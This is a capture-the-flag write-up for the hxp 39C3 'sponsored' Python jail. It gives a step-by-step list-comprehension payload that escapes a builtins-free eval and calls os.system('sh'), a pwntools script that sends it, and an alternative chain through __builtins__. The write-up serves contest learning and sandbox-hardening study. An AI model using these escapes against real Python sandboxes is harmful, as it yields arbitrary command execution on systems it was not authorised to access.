# hxp 39C3 CTF sponsored

```python
#!/usr/local/bin/python3

code = input("jail> ")
assert all(code.count(c) <= 1 for c in ".,(+)")
print(eval(code, {"__builtins__": {}}))
```

Requirements:

1. At most one occurrence for each character `.,(+)`: use function call + `__getattribute__` for `a.b`, call function step by step and save intermediate values via list comprehension
2. No builtins: use `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`

It is a stricter version of [SECCON CTF 2025 Quals excepython](../../2025-12-13-seccon-ctf-2025-quals/excepython.md), where loop and exception handling are removed.

Inspired by the solution by @D1N0 regarding excepython, we can use list comprehension to do function calls in multiple steps and save intermediate values. Here's the idea:

1. `[... for step in "1234567"]` allows us to do things in steps
2. `[[ex:= ...] for step in "1234567"]` allows us to assign `ex` to intermediate values and use it in the next iteration

Next, the things we need:

1. `a.b` becomes `a.__getattribute__(b)`; However, sometimes we need `a.__getattribute__(a, b)` when `a` is a type; so we split it into two steps: `ex[0].__getattribute__` and `ex[0](*ex[1])`
2. If we want to call `a.__getattribute__(a, b)`, we need `ex` to become `[a, a, b]`
3. So we need basic list operations: `ex+[x]` and `ex*2`
4. Then, we can convert `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` into multiple steps:

```python
# step a: ex = [[]]
# step b: ex = [[], "__setattr__"]
# step c: ex = [[].__getattribute__, "__setattr__"]
# step d: ex = [[].__setattr__]
# step e: ex = [[].__setattr__, "__objclass__"]
# step f: ex = [[].__setattr__.__getattribute__, "__objclass__"]
# step g: ex = [object]
# step h: ex = [object, object]
# step i: ex = [object, object, "__subclasses__"]
# step j: ex = [object.__getattribute__, object, "__subclasses__"]
# step k: ex = [object.__subclasses__]
# step l: ex = [object.__subclasses__()]
# step m: ex = [<class 'os._wrap_close'>]
# step n: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>]
# step o: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>, "__init__"]
# step p: ex = [<class 'os._wrap_close'>.__getattribute__, <class 'os._wrap_close'>, "__init__"]
# step q: ex = [<class 'os._wrap_close'>.__init__]
# step r: ex = [<class 'os._wrap_close'>.__init__, "__globals__"]
# step s: ex = [<class 'os._wrap_close'>.__init__.__getattribute__, "__globals__"]
# step t: ex = [<class 'os._wrap_close'>.__init__.__globals__]
# step u: ex = [<built-in function system>]
# step v: ex = [<built-in function system>, "sh"]
# step w: system("sh")
os_wrap_index = 158
print([[ex := [[]] if step == "a" else ex + [x] if step == "b" or step == "e" or step == "i" or step == "o" or step == "r" or step == "v" else [ex[0].__getattribute__, *ex[1:]] if step == "c" or step == "f" or step == "j" or step == "p" or step == "s" else [ex[0](*ex[1:])] if step == "d" or step == "g" or step == "k" or step == "l" or step == "q" or step == "t" or step == "w" else ex*2 if step == "h" or step == "n" else [ex[0][os_wrap_index]] if step == "m" else [ex[0]["system"]] if step == "u" else None for x in ["__setattr__" if step == "b" else "__objclass__" if step == "e" else "__subclasses__" if step == "i" else "__init__" if step == "o" else "__globals__" if step == "r" else "sh" if step == "v" else None]] for step in "abcdefghijklmnopqrstuvw"])
```

Attack script that works both locally and in Docker:

```python
from pwn import *

if args.REMOTE:
    os_wrap_close_index = 167
    p = remote("172.18.0.2", 1024)
else:
    os_wrap_close_index = 158
    p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")

# step a: ex = [[]]
# step b: ex = [[], "__setattr__"]
# step c: ex = [[].__getattribute__, "__setattr__"]
# step d: ex = [[].__setattr__]
# step e: ex = [[].__setattr__, "__objclass__"]
# step f: ex = [[].__setattr__.__getattribute__, "__objclass__"]
# step g: ex = [object]
# step h: ex = [object, object]
# step i: ex = [object, object, "__subclasses__"]
# step j: ex = [object.__getattribute__, object, "__subclasses__"]
# step k: ex = [object.__subclasses__]
# step l: ex = [object.__subclasses__()]
# step m: ex = [<class 'os._wrap_close'>]
# step n: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>]
# step o: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>, "__init__"]
# step p: ex = [<class 'os._wrap_close'>.__getattribute__, <class 'os._wrap_close'>, "__init__"]
# step q: ex = [<class 'os._wrap_close'>.__init__]
# step r: ex = [<class 'os._wrap_close'>.__init__, "__globals__"]
# step s: ex = [<class 'os._wrap_close'>.__init__.__getattribute__, "__globals__"]
# step t: ex = [<class 'os._wrap_close'>.__init__.__globals__]
# step u: ex = [<built-in function system>]
# step v: ex = [<built-in function system>, "sh"]
# step w: system("sh")
code = f'[[ex := [[]] if step == "a" else ex + [x] if step == "b" or step == "e" or step == "i" or step == "o" or step == "r" or step == "v" else [ex[0].__getattribute__, *ex[1:]] if step == "c" or step == "f" or step == "j" or step == "p" or step == "s" else [ex[0](*ex[1:])] if step == "d" or step == "g" or step == "k" or step == "l" or step == "q" or step == "t" or step == "w" else ex*2 if step == "h" or step == "n" else [ex[0][{os_wrap_close_index}]] if step == "m" else [ex[0]["system"]] if step == "u" else None for x in ["__setattr__" if step == "b" else "__objclass__" if step == "e" else "__subclasses__" if step == "i" else "__init__" if step == "o" else "__globals__" if step == "r" else "sh" if step == "v" else None]] for step in "abcdefghijklmnopqrstuvw"]'
print(list(code.count(c) for c in ".,(+)"))
p.sendline(code.encode())
p.interactive()
```

Another approach that works in some environment, but not in the jail due to missing `__import__`:

```python
get_flag = '[].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")'
print([[[ex := [[lambda x: []][0] if step == "1" else ex if step == "3" else [lambda x: ex[0]][0] if step == "4" else [lambda x: ex["eval"]][0] if step == "6" else ex if step == "7" else ex.__getattribute__][0](*x)][0] for x in [["__reduce_ex__"] if step == "2" else [2] if step == "3" else ["__builtins__"] if step == "5" else [get_flag]]] for step in "1234567"])
```

It uses another chain: `[].__reduce_ex__(2)[0].__builtins__["eval"]("print(1234)")`. But it fails in `eval` sometimes.

CTF archive for this problem: <https://github.com/sajjadium/ctf-archives/tree/main/ctfs/hxp/2025/misc/sponsored>
